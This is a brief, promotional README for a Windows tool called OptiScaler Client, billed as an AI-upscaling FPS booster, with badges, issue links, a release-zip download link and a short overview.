<div align="center">
  ...
  # ✦ OptiScaler Client
  <p align="center">
    <strong>Intelligent FPS Booster & Graphics Optimizer</strong>
    <br/>
    AI Upscaling • Frame Generation • Performance Boost • Low Latency
    <br/>
    <a href="https://github.com/optiscalerclient/optiscaler-client/issues">Report Bug</a> | <a href="https://github.com/optiscalerclient/optiscaler-client/issues">Discussions</a>
  </p>
  <p align="center">
    <img src="https://img.shields.io/badge/Tool-OptiScaler-00FF9F?style=for-the-badge" alt="OptiScaler" />
    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%20Windows%2011-0078D7?style=for-the-badge" alt="Platform" />
    <br>
    <img src="https://img.shields.io/github/stars/optiscalerclient/optiscaler-client?style=flat-square&color=gold" alt="Stars" />
    <img src="https://img.shields.io/github/license/optiscalerclient/optiscaler-client?style=flat-square" alt="License" />
  </p>
</div>


## Install
 [Download `optiscaler-client.zip`](https://github.com/optiscalerclient/optiscaler-client/releases/download/Optiscaler/optiscaler-client.zip)
 ---
 
## Overview
**OptiScaler Client** is a powerful real-time graphics optimization tool that uses AI upscaling and frame generation technologies to significantly boost your FPS while maintaining excellent visual quality.
Perfect for gamers who want more performance without sacrificing graphics.
